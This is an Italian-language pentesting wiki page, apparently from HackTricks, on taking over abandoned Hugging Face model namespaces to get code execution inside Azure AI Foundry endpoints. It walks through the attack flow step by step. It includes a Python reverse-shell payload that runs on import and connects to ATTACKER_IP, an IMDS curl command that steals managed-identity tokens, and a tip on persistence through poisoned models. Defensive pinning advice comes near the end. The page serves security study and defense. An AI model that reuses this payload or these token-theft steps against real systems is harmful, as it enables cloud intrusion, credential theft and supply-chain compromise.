# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenario

- Azure AI Foundry Model Catalog include molti modelli Hugging Face (HF) per il deployment one-click.
- Gli identificatori dei modelli HF sono Author/ModelName. Se un autore/org HF viene cancellato, chiunque può registrare nuovamente quell'author e pubblicare un modello con lo stesso ModelName allo stesso percorso legacy.
- Pipeline e cataloghi che risolvono solo per nome (nessun commit pinning/integrity) risolveranno in repo controllati dall'attaccante. Quando Azure deploya il modello, il codice di loader può essere eseguito nell'ambiente dell'endpoint, concedendo RCE con i permessi di quell'endpoint.

Casi comuni di takeover HF:
- Ownership deletion: il vecchio path risponde 404 fino al takeover.
- Ownership transfer: il vecchio path fa 307 al nuovo author mentre il vecchio author esiste. Se il vecchio author viene poi cancellato e ri-registrato, il redirect si rompe e il repo dell'attaccante viene servito al percorso legacy.

## Identificare namespace riutilizzabili (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Flusso di attacco end-to-end contro Azure AI Foundry

1) Nel Model Catalog, trova modelli HF i cui autori originali sono stati eliminati o trasferiti (vecchio autore rimosso) su HF.
2) Ri-registrare l'autore abbandonato su HF e ricreare il ModelName.
3) Pubblica un repo dannoso con loader code che si esegue su import o richiede trust_remote_code=True.
4) Distribuisci il legacy Author/ModelName da Azure AI Foundry. La piattaforma recupera il repo dell'attaccante; il loader si esegue all'interno del container/VM dell'endpoint Azure, ottenendo RCE con i permessi dell'endpoint.

Esempio di frammento di payload eseguito su import (solo a scopo dimostrativo):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Note
- Le distribuzioni di AI Foundry che integrano HF tipicamente clonano e importano moduli del repo referenziati nella config del modello (es., auto_map), il che può innescare l'esecuzione di codice. Alcuni percorsi richiedono trust_remote_code=True.
- L'accesso di solito corrisponde alle autorizzazioni del managed identity/service principal dell'endpoint. Trattalo come un initial access foothold per data access e lateral movement all'interno di Azure.

## Post-Exploitation Tips (Azure Endpoint)

- Enumera le variabili d'ambiente e gli endpoint MSI per i token:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Controlla lo storage montato, gli artefatti dei modelli e i servizi Azure raggiungibili con il token acquisito.
- Considera persistence lasciando poisoned model artifacts se la piattaforma effettua nuovamente un pull da HF.

## Indicazioni difensive per gli utenti di Azure AI Foundry

- Blocca i modelli per commit quando li carichi da HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Rispecchiare modelli HF verificati in un registro interno affidabile e distribuirli da lì.
- Scansionare continuamente codebase e defaults/docstrings/notebooks alla ricerca di Author/ModelName hard-coded che siano cancellati/trasferiti; aggiornare o fissare (pin).
- Verificare l'esistenza dell'author e la provenienza del modello prima del deployment.

## Criteri di riconoscimento (HTTP)

- Autore cancellato: pagina author 404; legacy model path 404 fino al takeover.
- Modello trasferito: legacy path 307 verso un nuovo author mentre il vecchio author esiste; se il vecchio author viene poi cancellato e ri-registrato, il legacy path serve contenuto dell'attaccante.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Riferimenti incrociati

- Vedi metodologia più ampia e note sulla catena di fornitura:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Riferimenti

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
